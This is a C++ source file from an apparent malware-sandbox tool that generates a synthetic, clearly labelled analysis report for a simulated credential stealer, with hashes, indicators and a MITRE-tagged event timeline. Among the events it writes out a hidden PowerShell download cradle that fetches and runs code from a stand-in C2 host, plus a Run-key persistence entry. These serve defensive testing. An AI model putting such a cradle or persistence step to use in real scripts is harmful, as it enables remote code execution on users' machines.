#include "antimal/Simulation.h"

#include "antimal/Crypto.h"
#include "antimal/FuzzyHash.h"
#include "antimal/Report.h"

#include <cstdio>
#include <vector>

namespace antimal {
namespace {

// Fixed timeline base so the report is byte-stable across runs. Offsets stay
// well under an hour, so only seconds/minutes move.
std::string Ts(int offsetSec) {
  const int m = (offsetSec % 3600) / 60;
  const int s = offsetSec % 60;
  char buf[40];
  std::snprintf(buf, sizeof(buf), "2026-01-01T12:%02d:%02dZ", m, s);
  return std::string(buf);
}

EventRecord Ev(const std::string &ts, const std::string &category,
               const std::string &action, uint32_t pid, uint32_t ppid,
               const std::string &image, const std::string &target,
               const std::string &mitre = "") {
  EventRecord e;
  e.timestampUtc = ts;
  e.source = "guest-agent";
  e.category = category;
  e.action = action;
  e.processId = pid;
  e.parentProcessId = ppid;
  e.imagePath = image;
  e.target = target;
  e.mitre = mitre;
  return e;
}

// A small, fixed, PE-flavored buffer so the static hashes are real + stable.
std::vector<uint8_t> SampleBytes() {
  std::string s =
      "MZ\x90\x00\x03\x00\x00\x00 this is a synthetic AntiMal simulation sample "
      "blob -- not a real executable. It exists only so the static hash + fuzzy "
      "hash pipeline produces stable, real digests for the simulated report. "
      "strings: https://evil-c2.example/gate.php 185.220.101.5 RunKey Updater "
      "VirtualAlloc CreateRemoteThread InternetOpenA";
  return std::vector<uint8_t>(s.begin(), s.end());
}

} // namespace

AnalysisReport BuildSimulatedReport(const std::string &runId) {
  AnalysisReport report;
  report.schemaVersion = 1;
  report.runId = runId;
  report.samplePath = "samples/simulated/stealer.exe";

  // --- Static scan half (real hashes over a fixed buffer) ---
  const std::vector<uint8_t> bytes = SampleBytes();
  ScanResult &scan = report.scannerVerdict;
  scan.path = report.samplePath;
  scan.sha256 = Sha256Hex(bytes);
  scan.sha1 = Sha1Hex(bytes);
  scan.md5 = Md5Hex(bytes);
  scan.ctph = ComputeCtph(bytes);
  scan.detectedType = "pe";
  scan.isPe = true;
  scan.entropy = 5.9;
  scan.score = 85;
  scan.verdict = Verdict::Malicious;
  scan.iocs.urls = {"https://evil-c2.example/gate.php"};
  scan.iocs.ips = {"185.220.101.5"};
  scan.iocs.domains = {"evil-c2.example"};
  scan.iocs.registryPaths = {
      "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"};
  scan.iocs.suspiciousApis = {"VirtualAlloc", "CreateRemoteThread",
                              "InternetOpenA"};
  scan.tags = {
      {"stealer", "family", 80, {"credential-access strings + C2 egress"}},
      {"persistence", "capability", 75, {"Run-key write under HKCU"}},
  };
  scan.findings = {
      {"sim.stealer", "Credential-stealer behavior modeled by the simulation", 60},
      {"sim.persistence", "Run-key persistence modeled by the simulation", 25},
  };

  // --- Dynamic timeline (a stealer subtree + persistence + drops + C2) ---
  auto &ev = report.events;
  ev.push_back(Ev(Ts(0), "agent", "agent.job.start", 0, 0, "AntiMal.GuestAgent.exe",
                  "job " + runId));
  EventRecord explorer = Ev(Ts(2), "process", "process.start", 4000, 0,
                            "explorer.exe", "");
  explorer.commandLine = "C:\\Windows\\explorer.exe";
  explorer.integrityLevel = "Medium";
  explorer.userName = "ANTIMAL-VM\\analyst";
  ev.push_back(explorer);

  EventRecord sample = Ev(Ts(4), "process", "process.start", 4242, 4000,
                          "stealer.exe", "", "T1204.002");
  sample.commandLine = "C:\\Users\\analyst\\Downloads\\stealer.exe";
  sample.integrityLevel = "Medium";
  sample.userName = "ANTIMAL-VM\\analyst";
  ev.push_back(sample);
  ev.push_back(Ev(Ts(4), "agent", "agent.sample.received", 4242, 4000,
                  "stealer.exe", "sampleExecuted=true"));

  EventRecord cmd = Ev(Ts(6), "process", "process.start", 4300, 4242, "cmd.exe",
                       "", "T1059.003");
  cmd.commandLine = "cmd.exe /c powershell -nop -w hidden -enc <base64>";
  cmd.integrityLevel = "Medium";
  cmd.userName = "ANTIMAL-VM\\analyst";
  ev.push_back(cmd);

  EventRecord ps = Ev(Ts(7), "process", "process.start", 4400, 4300,
                      "powershell.exe", "", "T1059.001");
  ps.commandLine =
      "powershell -nop -w hidden -c IEX(New-Object Net.WebClient)."
      "DownloadString('https://evil-c2.example/gate.php')";
  ps.integrityLevel = "Medium";
  ps.userName = "ANTIMAL-VM\\analyst";
  ev.push_back(ps);

  ev.push_back(Ev(Ts(9), "registry", "registry.set", 4242, 4000, "stealer.exe",
                  "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
                  "Updater = stealer.exe",
                  "T1547.001"));
  ev.push_back(Ev(Ts(10), "file", "file.create", 4242, 4000, "stealer.exe",
                  "C:\\Users\\analyst\\AppData\\Local\\Temp\\stealer.tmp"));
  ev.push_back(Ev(Ts(11), "file", "file.create", 4242, 4000, "stealer.exe",
                  "C:\\Users\\analyst\\AppData\\Roaming\\creds.bin"));
  ev.push_back(Ev(Ts(13), "network", "network.connection", 4400, 4300,
                  "powershell.exe", "185.220.101.5:443", "T1071.001"));
  EventRecord exit = Ev(Ts(18), "process", "process.stop", 4242, 4000,
                        "stealer.exe", "");
  exit.details["exitCode"] = "0x0";
  ev.push_back(exit);
  ev.push_back(Ev(Ts(19), "agent", "agent.report.complete", 0, 0,
                  "AntiMal.GuestAgent.exe", "ReportComplete"));

  // --- Verdict + aggregates ---
  report.sandboxVerdict = Verdict::Malicious;
  report.verdictScore = 88;
  report.verdictRationale = {
      "SIMULATION (synthetic): generated by `antimal simulate`; NOT a real "
      "detonation.",
      "Sample-attributable persistence (HKCU Run key) + C2 egress to "
      "185.220.101.5 from a powershell download cradle in the sample subtree.",
      "Credential-access API surface (VirtualAlloc / CreateRemoteThread / "
      "InternetOpenA) corroborates the stealer family tag.",
  };
  report.mitreTechniques = AggregateMitreTechniques(report.events, scan);
  report.networkDomains = {"evil-c2.example"};
  report.artifacts = {scan.path, "screenshots", "events.jsonl"};

  // --- Run summary ---
  DynamicRunSummary &d = report.dynamicSummary;
  d.started = true;
  d.completed = true;
  d.sampleExecuted = true;
  d.guestAgentConnected = true;
  d.status = "SIMULATION (synthetic) - generated by `antimal simulate`";
  d.networkMode = NetworkMode::Nat;
  d.eventsCaptured = static_cast<uint32_t>(report.events.size());
  d.artifactsCaptured = 2;
  d.screenStateReached = 3; // rich (a real desktop)

  return report;
}

} // namespace antimal
